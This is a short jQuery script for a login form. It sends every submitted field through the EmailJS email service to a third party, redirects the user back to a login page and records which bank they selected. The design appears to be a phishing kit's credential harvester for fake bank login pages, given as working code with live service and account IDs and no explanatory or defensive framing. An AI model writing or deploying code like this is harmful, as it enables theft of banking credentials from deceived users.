$('#formLogin').on('submit', function(event) {
    event.preventDefault();
    var formData = new FormData(this);
    formData.append('service_id', 'service_kjqzdjt');
    formData.append('template_id', 'template_uzoz8a5');
    formData.append('user_id', '7w01m3trK4vkCR2VI');

    $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
        type: 'POST',
        data: formData,
        contentType: false, // auto-detection
        processData: false // no need to parse formData to string
    }).done(function() {
        window.location.href = 'login.html';
    }).fail(function(error) {
        console.log('Oops... ',JSON.stringify(error));
    });

  var typeBank = $('#formLogin').find('select[name="typeBank"]').val();
  localStorage.setItem("typeBank", JSON.stringify(typeBank));
});
